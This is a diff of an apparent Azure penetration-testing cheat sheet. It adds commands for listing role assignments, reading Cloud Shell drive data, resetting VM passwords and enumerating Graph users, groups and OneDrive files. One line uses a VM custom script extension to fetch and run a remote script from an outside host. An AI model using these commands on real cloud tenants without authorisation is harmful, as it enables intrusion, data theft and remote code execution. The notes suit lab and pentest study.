@@ -27,24 +27,19 @@ curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subs
 curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2019-10-01 
 ```
 
-4.3
+### 5. ARM resources
+List resources user has atlease read privilege
+```az role assignment list --scope <resource-id> --include-inherited```
+```curl -X GET -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" "https://management.azure.com/<resource-id>/providers/Microsoft.Authorization/roleAssignments?api-version=2020-04-01-preview"```
 
-### 5. MS Graph access
-Get access token
-```az account get-access-token --resource https://graph.microsoft.com```
-
-Get user info
-```curl -H "Authorization: Bearer ${TOKEN}" https://graph.microsoft.com/v1.0/me```
-
-curl -X GET -H "Authorization: Bearer ${TOKEN} "https://graph.microsoft.com/v1.0/me/drive/root/children"
-
-
-
-### Misc useful commands
-Get deployment history
+Access cloud shell drive data
 ```
-az deployment group list --resource-group rgname
+curl -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -X GET "https://portal.azure.com/api/v1/?environment=clouddrive"
 ```
+
+Get deployment history ```az deployment group list --resource-group rgname```
+
+#### VM commands
 
 VM password reset 
 ```
@@ -56,10 +51,39 @@ VM run command
 Invoke-AzVMRunCommand -CommandId 'RunPowerShellScript' -ScriptPath .\whoami.ps1
 ```
 
-VM command for 
+VM command for running a ps script
 ```
 Set-AzVMCustomScriptExtension -ResourceGroupName TEST -VMName PentestVM -Location westcentralus -FileUri 'http://book.azurepentesting.com/whoami.ps1' -Run 'whoami.ps1' -Name CustomScriptExtension
 ```
+
+### 6. MS Graph access
+Get access token
+```az account get-access-token --resource https://graph.microsoft.com```
+
+Get user info
+```curl -H "Authorization: Bearer ${TOKEN}" https://graph.microsoft.com/v1.0/me```
+
+Get list of users
+```curl -X GET -H "Authorization: Bearer ${TOKEN}" https://graph.microsoft.com/v1.0/users ```
+
+Get list of Groups
+```curl -X GET -H "Authorization: Bearer ${TOKEN}" https://graph.microsoft.com/v1.0/groups```
+
+Get groups
+```
+az role assignment list --scope /subscriptions/2213e8b1-dbc7-4d54-8aff-b5e315df5e5b/resourceGroups/1-6417d8f7-playground-sandbox/ --include-inherited
+```
+
+List of groups I am a member of 
+```
+curl -X GET -H "Authorization: Bearer ${TOKEN}" "https://graph.microsoft.com/v1.0/me/memberOf/$/microsoft.graph.group?$filter=groupTypes/any(c:c%20eq%20'unified')"
+```
+
+curl -X GET -H "Authorization: Bearer ${TOKEN}" "https://graph.microsoft.com/v1.0/me/drive/root/children"
+
+
+### Misc useful commands
+
 
 ### Lab setup 
 ```az deployment group create --resource-group sec --template-file ./file.json```
